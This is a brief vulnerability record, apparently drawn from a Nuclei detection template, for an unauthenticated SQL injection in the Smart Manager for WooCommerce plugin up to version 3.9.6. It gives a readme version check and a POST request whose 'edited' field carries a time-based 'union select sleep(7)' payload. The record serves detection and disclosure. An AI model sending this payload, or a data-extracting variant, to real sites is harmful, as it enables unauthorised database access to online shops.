# Vulnerability: Smart Manager for WooCommerce & WPeC <= 3.9.6 - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`wp-smart-manager-sqli.yaml`)

## Description
The Smart Manager For WooCommerce – Stock Management, Bulk Edit & more… WordPress plugin was affected by an Unauthenticated SQL Injection security vulnerability.

## Secure Mitigation
Fixed in version 3.9.7

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-content/plugins/smart-manager-for-wp-e-commerce/readme.txt HTTP/1.1
Host: {{Hostname}}

@timeout: 15s
POST /wp-content/plugins/smart-manager-for-wp-e-commerce/sm/woo-json.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

cmd=saveData&edited=%5B%7B%22id%22%3A%22+1%29+union+select+sleep%287%29%2C2%3B+--+%22%7D%5D
```

